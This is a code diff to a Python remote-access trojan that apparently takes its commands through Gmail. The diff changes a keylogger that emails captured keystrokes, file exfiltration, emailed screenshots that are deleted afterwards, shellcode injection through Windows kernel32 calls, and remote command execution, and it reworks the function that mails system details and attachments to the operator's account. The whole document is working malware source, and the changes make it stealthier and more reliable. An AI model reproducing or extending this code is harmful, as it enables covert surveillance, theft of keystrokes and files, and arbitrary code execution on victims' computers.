@@ -4,6 +4,7 @@ import os
 import base64
 import binascii
 import multiprocessing
+import threading
 import time
 import random
 import string
@@ -95,22 +96,22 @@ class KeyLogger(multiprocessing.Process):
         self.jobid = None
         self.key_buffer = ''
 
-        #self.daemon = True
+        self.daemon = True
 
     def run(self):
         logging.debug("[keylogger] started with jobid: {}".format(self.jobid))
 
-        hm = pyHook.HookManager() 
-        hm.KeyDown = self.onKeyboardEvent 
-        hm.HookKeyboard() 
-        pythoncom.PumpMessages()
+        while True:
+            hm = pyHook.HookManager() 
+            hm.KeyDown = self.onKeyboardEvent 
+            hm.HookKeyboard() 
+            pythoncom.PumpMessages()
 
     def stop(self):
         logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))
         self.terminate()
 
     def onKeyboardEvent(self, event):
-        
         if event.Ascii != 0 or 8:
             self.key_buffer += chr(event.Ascii)
         
@@ -119,7 +120,9 @@ class KeyLogger(multiprocessing.Process):
 
         if len(self.key_buffer) is 100:
             logging.debug("[keylogger] Resetting key_buffer")
-            sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, jobid=self.jobid)
+            t = threading.Thread(name='sendEmail', target=sendEmail, args=({'CMD': 'keylogger', 'RES': self.key_buffer}, self.jobid,))
+            t.setDaemon(True)
+            t.start()
             self.key_buffer = ''
 
 class download(multiprocessing.Process):
@@ -129,15 +132,17 @@ class download(multiprocessing.Process):
         self.jobid = jobid
         self.filepath = filepath
 
-        #self.daemon = True
+        self.daemon = True
         self.start()
 
     def run(self):
         try:
             if os.path.exists(self.filepath) is True:
-                SendEmail({'CMD': 'download', 'RES': 'Success'}, self.jobid, [self.filepath])
+                sendEmail({'CMD': 'download', 'RES': 'Success'}, self.jobid, [self.filepath])
+            else:
+                sendEmail({'CMD': 'download', 'RES': 'Path to file invalid'}, self.jobid)
         except Exception as e:
-            SendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, self.jobid)
+            sendEmail({'CMD': 'download', 'RES': 'Failed: {}'.format(e)}, self.jobid)
 
 class lockScreen(multiprocessing.Process):
 
@@ -145,7 +150,7 @@ class lockScreen(multiprocessing.Process):
         multiprocessing.Process.__init__(self)
         self.jobid = jobid
 
-        #self.daemon = True
+        self.daemon = True
         self.start()
 
     def run(self):
@@ -154,41 +159,26 @@ class lockScreen(multiprocessing.Process):
             sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=self.jobid)
         except Exception as e:
             if verbose == True: print print_exc()
-"""
+
 class screenshot(multiprocessing.Process):
 
     def __init__(self, jobid):
         multiprocessing.Process.__init__(self)
         self.jobid = jobid
 
-        #self.daemon = True
+        self.daemon = True
         self.start()
-
+    
     def run(self):
         try:
-            screen_dir = os.getenv('TEMP')
             img=ImageGrab.grab()
-            saveas= os.path.join(screen_dir, genRandomString() + '.png')
+            saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.png')
             img.save(saveas)
             sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=self.jobid, attachment=[saveas])
-            #os.remove(saveas)
+            os.remove(saveas)
         except Exception as e:
             if verbose == True: print_exc()
             pass
-"""
-
-def screenshot(jobid):
-    try:
-        #screen_dir = os.getenv('TEMP')
-        img=ImageGrab.grab()
-        saveas= os.path.join(os.getenv('TEMP'), genRandomString() + '.png')
-        img.save(saveas)
-        sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=jobid, attachment=[saveas])
-        time.sleep(0.5)
-        os.remove(saveas)
-    except Exception as e:
-        if verbose == True: print_exc()
-        pass
 
 class execShellcode(multiprocessing.Process):
 
@@ -197,7 +187,7 @@ class execShellcode(multiprocessing.Process):
         self.shellc = shellc
         self.jobid = jobid
 
-        #self.daemon = True
+        self.daemon = True
         self.start()
 
     def run(self):
@@ -222,6 +212,7 @@ class execShellcode(multiprocessing.Process):
             
             ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
+            sendEmail({"CMD": 'execshellcode', 'RES': 'Success'}, jobid=self.jobid)
         except Exception as e:
             if verbose == True: print_exc()
 
@@ -232,7 +223,7 @@ class execCmd(multiprocessing.Process):
         self.command = command
         self.jobid = jobid
 
-        #self.daemon = True
+        self.daemon = True
         self.start()
 
     def run(self):
@@ -246,54 +237,41 @@ class execCmd(multiprocessing.Process):
             if verbose == True: print_exc()
             pass
 
-class sendEmail(multiprocessing.Process):
+def sendEmail(text, jobid='', attachment=[], checkin=False):
+    sub_header = uniqueid
+    if jobid:
+        sub_header = 'imp:{}:{}'.format(uniqueid, jobid)
+    elif checkin:
+        sub_header = 'checkin:{}'.format(uniqueid)
 
-    def __init__(self, text, jobid='', attachment=[], checkin=False):
-        
-        multiprocessing.Process.__init__(self)
-        self.text = text
-        self.jobid = jobid
-        self.attachment = attachment
-        self.checkin = checkin
-        
-        self.daemon = True
-        self.start()
+    msg = MIMEMultipart()
+    msg['From'] = sub_header
+    msg['To'] = gmail_user
+    msg['Subject'] = sub_header
 
-    def run(self):
-        sub_header = uniqueid
-        if self.jobid:
-            sub_header = 'imp:{}:{}'.format(uniqueid, self.jobid)
-        elif self.checkin:
-            sub_header = 'checkin:{}'.format(uniqueid)
+    message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': text}
+    msg.attach(MIMEText(str(message_content)))
 
-        msg = MIMEMultipart()
-        msg['From'] = sub_header
-        msg['To'] = gmail_user
-        msg['Subject'] = sub_header
+    for attach in attachment:
+        if os.path.exists(attach) == True:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(open(attach, 'rb').read())
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
+            msg.attach(part)
 
-        message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': self.text}
-        msg.attach(MIMEText(str(message_content)))
-
-        for attach in self.attachment:
-            if os.path.exists(attach) == True:
-                part = MIMEBase('application', 'octet-stream')
-                part.set_payload(open(attach, 'rb').read())
-                Encoders.encode_base64(part)
-                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
-                msg.attach(part)
-
-        while True:
-            try:
-                mailServer = SMTP()
-                mailServer.connect(server, server_port)
-                mailServer.starttls()
-                mailServer.login(gmail_user,gmail_pwd)
-                mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
-                mailServer.quit()
-                break
-            except Exception as e:
-                if verbose == True: print_exc()
-                time.sleep(10)
+    while True:
+        try:
+            mailServer = SMTP()
+            mailServer.connect(server, server_port)
+            mailServer.starttls()
+            mailServer.login(gmail_user,gmail_pwd)
+            mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
+            mailServer.quit()
+            break
+        except Exception as e:
+            if verbose == True: print_exc()
+            time.sleep(10)
 
 def checkJobs():
     #Here we check the inbox for queued jobs, parse them and start a thread
